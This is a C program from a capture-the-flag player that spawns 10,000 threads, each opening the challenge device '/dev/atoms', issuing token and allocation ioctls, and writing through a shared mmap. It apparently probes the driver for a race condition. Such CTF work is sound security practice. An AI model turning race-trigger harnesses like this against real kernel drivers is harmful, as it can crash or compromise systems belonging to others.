/*
 * author: @meowmeowxw
 *
 * ctf team: https://ctftime.org/team/117852
 */
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <pthread.h>
#include <stdlib.h>

#define DEV_PATH "/dev/atoms"
#define TOKEN 0xdeadbeef
#define ATOMS_USE_TOKEN 0x4008d900
#define ATOMS_ALLOC 0xc010d902
#define ATOMS_RELEASE 0xd903
#define ATOMS_BHO 0x8018d901
#define NUM_THREAD 10000

struct atoms_ioctl_alloc {
    long int size;
};

void *access_device(void *argv) {
    struct atoms_ioctl_alloc arg = {
        .size = 0x1000,
    };
    int fd = open(DEV_PATH, O_RDWR);
    printf("fd: %d\t of thread: %d\n", fd, *(int *)argv);
    ioctl(fd, ATOMS_USE_TOKEN, TOKEN);

    ioctl(fd, ATOMS_ALLOC, &arg);

    void *ptr = mmap(0, 0x1000, PROT_WRITE, MAP_SHARED, fd, 0);
    assert(ptr != MAP_FAILED);
    strcpy((char*)ptr, "mex");
    munmap(ptr, 0x1000);

    close(fd);
    printf("end: %d\n", *(int *)argv);
    return NULL;
}

int main(int argc, char *argv[]) {
    pthread_t *th = malloc(sizeof(pthread_t) * NUM_THREAD);
    int *args = malloc(sizeof(int) * NUM_THREAD);

    for (int i = 0; i < NUM_THREAD; i++) {
        args[i] = i;
        pthread_create(&th[i], NULL, access_device, &args[i]);
    }

    for (int i = 0; i < NUM_THREAD; i++) {
        pthread_join(th[i], NULL);
    }
     
    return 0;
}
